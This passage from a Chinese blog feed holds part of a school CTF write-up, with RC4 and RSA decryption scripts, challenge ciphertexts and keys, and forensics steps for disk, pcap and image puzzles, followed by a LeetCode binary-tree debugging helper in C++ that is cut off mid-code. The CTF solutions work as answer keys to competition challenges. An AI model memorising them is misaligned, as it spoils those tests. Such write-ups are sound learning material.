        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># main("jnsec","xxxxxxxxxxxx")</span>

<span class="token comment"># ciphertext = w7okesOpwr0YYEtYwqYPSQ==</span>
<span class="token comment"># key = jnsec</span>

<span class="token comment"># flag = JNCTF&#123;xxxxxxxxxxxx&#125;</span>
<span class="token comment"># Try to decrypt it !</span></code></pre>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目给出了加密程序以及密文，则将加密程序反写得到解密程序，并将密文作为输入，得到 flag 值。</p>
<h3 id="解密脚本-1"><a href="#解密脚本-1" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64


<span class="token keyword">def</span> <span class="token function">init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> s_box


<span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> cipher<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> r <span class="token keyword">in</span> res<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    ciphertext <span class="token operator">=</span> <span class="token string">"w7okesOpwr0YYEtYwqYPSQ=="</span>
    key <span class="token operator">=</span> <span class="token string">"jnsec"</span>
    box <span class="token operator">=</span> init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    decrypt<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> box<span class="token punctuation">)</span></code></pre>

<h3 id="心得-1"><a href="#心得-1" class="headerlink" title="心得"></a>心得</h3><p>本题重点在于程序的正确反写，即先 base64 解密，再单独对每个字符进行处理，需要注意的是异或（^）反写仍然是异或。</p>
<h2 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h2><h3 id="问题描述-2"><a href="#问题描述-2" class="headerlink" title="问题描述"></a>问题描述</h3><pre class="language-none"><code class="language-none"># baby_rsa
c &#x3D; 10037709916698055005402119185691833127096330074819596592018139982119855547820
n &#x3D; 73069886771625642807435783661014062604264768481735145873508846925735521695159
e &#x3D; 65537</code></pre>

<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>给出了 RSA 加密的c（密文）、n、e，则考虑先将 n 大数分解得到 p 和 q，再根据 RSA 加密的原理求解 d，并根据解密公式求解明文 m，最后将 m 转换成 bytes 格式，得到 flag值。</p>
<h3 id="解密脚本-2"><a href="#解密脚本-2" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

n <span class="token operator">=</span> <span class="token number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span>
p <span class="token operator">=</span> <span class="token number">189239861511125143212536989589123569301</span>
q <span class="token operator">=</span> <span class="token number">386123125371923651191219869811293586459</span>
c <span class="token operator">=</span> <span class="token number">10037709916698055005402119185691833127096330074819596592018139982119855547820</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
k <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> phi_n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> e <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token punctuation">(</span>k <span class="token operator">*</span> phi_n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> e
        <span class="token keyword">break</span>
    k <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"d值为："</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"m值为："</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="心得-2"><a href="#心得-2" class="headerlink" title="心得"></a>心得</h3><p>本题我最后没有求解成功，按理说就是很常规的 RSA 加密求解，但是本题出的很坑的一点在于题目并没有说明最后需要对明文 m 进行 <code>long_to_bytes()</code> 的处理，这很容易让解题者误以为是明文求解错误。不过另一方面也反映了我对于将整型数据转换成字节数据这一知识点的缺失。</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="easy-disk"><a href="#easy-disk" class="headerlink" title="easy_disk"></a>easy_disk</h2><h3 id="问题描述-3"><a href="#问题描述-3" class="headerlink" title="问题描述"></a>问题描述</h3><p>题目给出了一个名为 <strong>bomb.img</strong> 的磁盘文件，查找 flag 值。</p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>dishgenius 打开虚拟磁盘文件 bomb.img，打开后点击右边窗口的“浏览文 件”，发现三个0字节的空文件，点击软件上面的“恢复文件”，得到一个 ZIP 压缩包和一个 txt 文件。</p>
<p>txt 文件提示为“C4炸弹”，百度可知CS系列游戏中的 C4 炸弹密码为7355608， 解压后得到一个二维码，但二维码三个定位点均被抹去，利用ps等软件恢复二 维码后，扫描二维码得到flag。</p>
<h3 id="心得-3"><a href="#心得-3" class="headerlink" title="心得"></a>心得</h3><p>本题我倒是没有按照正规解法——分析磁盘文件来解决。在看到磁盘文件时，我第一时间想到使用 foremost 文件将其分离，只得到一个 ZIP 压缩包，随后根据题目描述的 bomb 等信息考虑到暴力破解该压缩包，最终也成功将压缩包解压。但是如果密码相对复杂那么暴力破解可能不会成功，因此了解各种文件类型的分析方法是至关重要的。</p>
<p><img src="/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/bomb.png"></p>
<h2 id="big-shark"><a href="#big-shark" class="headerlink" title="big_shark"></a>big_shark</h2><h3 id="问题描述-4"><a href="#问题描述-4" class="headerlink" title="问题描述"></a>问题描述</h3><p>题目给出一个 pcapng 格式的数据包文件，查找 flag 值。</p>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>以 wireshark 为例，打开流量包，筛选 HTTP 协议，发现成堆的 sql 注入攻击流量，进一步简单筛选带有关键词的 http 协议流量 http contains “select” 。</p>
<p>按时间顺序记录下攻击语句中的 ascii 值，解码后拼接在一起发现是一串字符且以 = 结尾，判断为 base64 编码，因此再 base64 解码，得到flag。</p>
<h3 id="解密脚本-3"><a href="#解密脚本-3" class="headerlink" title="解密脚本"></a>解密脚本</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64

dic <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span>
       <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">]</span>
m <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> e <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
    m <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h3 id="心得-4"><a href="#心得-4" class="headerlink" title="心得"></a>心得</h3><p>我虽然对计算机网络的知识几乎几无所知，也不清楚 pcapng 是什么文件类型，但还是在查阅网络资料的情况下，按照网上已有的样例，按部就班的得到了相应的 ascii 码并最终将其解码，可见用好搜索引擎的重要性(doge)。</p>
<h2 id="magic-photo"><a href="#magic-photo" class="headerlink" title="magic_photo"></a>magic_photo</h2><h3 id="问题描述-5"><a href="#问题描述-5" class="headerlink" title="问题描述"></a>问题描述</h3><p>题目给了一张 jpg 格式图片，查找 flag 值。</p>
<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>使用 010Editor 打开图片，发现16进制编码中有Unicode以及坐标。</p>
<p><img src="/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/unicode.png"></p>
<p>将 unicode 转换成字符，得到一串 emoji 字符，根据提示进行 emoji-aes 在线解密：<a href="https://aghorler.github.io/emoji-aes/#">emoji-aes</a>.</p>
<p><img src="/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/pos.png"></p>
<p>根据图二坐标绘制点阵图，得到 emoji-aes 解密密钥。</p>
<p><img src="/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/plot.png"></p>
<p>最后进行在线解密，得到 flag 值。</p>
<h3 id="心得-5"><a href="#心得-5" class="headerlink" title="心得"></a>心得</h3><p>本题我认为出的是非常坑了，我首先用 foremost 将图片分离得到 ZIP 压缩包和一个提示的文本文件，文本提示“你了解这位小姐姐嘛？”，猜测为图片中人物的某些信息。</p>
<p>故使用百度识图得到图片人物为<strong>吉克隽逸</strong>，最终得到压缩包密码为她的生日 19880513。</p>
<p>解压后得到一个音频文件，为她演唱的一首歌，在歌的末尾含有一串摩尔斯电码，观察该音频文件的波形图并记录下摩尔斯电码并解密，得到**JNCTFDOY0UTH1NKYOUARERI9HT?**，显然，这是一个虚假的 flag。</p>
<p>个人认为，坑不是不能有，但得到这样错误结果的代价也是不小的，且正确解法与错误解法之间完全没有任何联系，希望出题人能平衡好这其中的差别。</p>
]]></content>
      <categories>
        <category>经验</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>高效的LeetCode二叉树本地IDE调试方案</title>
    <url>/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>在 LeetCode 刷题过程中，有时候遇到一些难以难以直接观察出来的错误，此时通常想要利用单步调试来解决，但奈何只有 LeetCode Plus 会员才可以使用其网页的调试功能。好在绝大部分本地 IDE 都具备十分强大的调试功能，我们只需要将自己的解题代码复制到本地，并编写简单的测试程序即可。但是对于二叉树相关的题，测试数据的编写显得不那么容易，本文编写了一个匹配 LeetCode 题目中的二叉树定义的类，该类包含一些基本的静态函数，能够很方便地实现二叉树的构造和二叉树的遍历。</p>
<span id="more"></span>

<h1 id="LeetCode-二叉树的序列表示方式"><a href="#LeetCode-二叉树的序列表示方式" class="headerlink" title="LeetCode 二叉树的序列表示方式"></a>LeetCode 二叉树的序列表示方式</h1><p>LeetCode 中针对二叉树的输入数据以一个<strong>层序遍历</strong>序列的形式给出。与通常我们所说的层序序列不同的是，该层序序列包含从根节点到最后一个非空结点之间的所有空结点，该空结点以 <strong>null</strong> 的标识符给出，以此保证根据此序列所构造二叉树的唯一性（单纯依靠常规的不含空结点的层序序列无法构造一棵唯一的二叉树）。以下是一个简单的例子：</p>
<p><strong>输入：</strong> <code>root = [3, 9, 20, null, null, 15, 7]</code></p>
<p><img src="/2023/10/17/%E9%AB%98%E6%95%88%E7%9A%84LeetCode%E4%BA%8C%E5%8F%89%E6%A0%91%E6%9C%AC%E5%9C%B0IDE%E8%B0%83%E8%AF%95%E6%96%B9%E6%A1%88/tree1.jpg"></p>
<h1 id="带构造与遍历的二叉树类"><a href="#带构造与遍历的二叉树类" class="headerlink" title="带构造与遍历的二叉树类"></a>带构造与遍历的二叉树类</h1><p>为了方便能在本地 IDE 中直接根据输入数据的格式构造二叉树，本文编写了两个简单的静态方法，来方便数据的输入与输出。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">null</span> <span class="token expression">INT32_MAX</span></span>
<span class="token keyword">struct</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> val<span class="token punctuation">;</span>
	TreeNode<span class="token operator">*</span> left<span class="token punctuation">,</span> <span class="token operator">*</span> right<span class="token punctuation">;</span>
	<span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> val <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> left <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">,</span> TreeNode<span class="token operator">*</span> right <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>
		<span class="token operator">:</span> <span class="token function">val</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">left</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">right</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
	<span class="token comment">// 带空结点的层序遍历</span>
	<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">orderTraversalWithNull</span><span class="token punctuation">(</span>TreeNode<span class="token operator">*</span> root<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>root <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
		queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
		vector<span class="token operator">&lt;</span>string<span class="token operator">></span> buf<span class="token punctuation">;</span> <span class="token comment">// 输出缓冲</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token string">"null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			buf<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span><span class="token function">to_string</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>fNode<span class="token operator">-></span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"null"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			buf<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 去除末尾多余的空结点</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> val <span class="token operator">:</span> buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			cout <span class="token operator">&lt;&lt;</span> val <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// 根据层序序列创建二叉树</span>
	<span class="token keyword">static</span> TreeNode<span class="token operator">*</span> <span class="token function">createTreeByOrder</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> order<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> order<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
		queue<span class="token operator">&lt;</span>TreeNode<span class="token operator">*</span><span class="token operator">></span> q<span class="token punctuation">;</span>
		<span class="token keyword">int</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 指向当前结点的子结点</span>
		TreeNode<span class="token operator">*</span> root <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			TreeNode<span class="token operator">*</span> fNode <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>fNode <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				TreeNode<span class="token operator">*</span> lChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					lChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				fNode<span class="token operator">-></span>left <span class="token operator">=</span> lChild<span class="token punctuation">;</span>
				q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>lChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token operator">++</span>idx<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>idx <span class="token operator">&lt;</span> order<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				TreeNode<span class="token operator">*</span> rChild <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					rChild <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TreeNode</span><span class="token punctuation">(</span>order<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
				fNode<span class="token operator">-></span>right <span class="token operator">=</span> rChild<span class="token punctuation">;</span>
				q<span class="token punctuation">.</span><span class="token function">emplace</span><span class="token punctuation">(</span>rChild<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token operator">++</span>idx<span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">return</span> root<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>

<p>使用的方法也很简单，由于两个方法都是 TreeNode 类中的静态方法，可使用 <code>::</code> 符对其进行调用。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
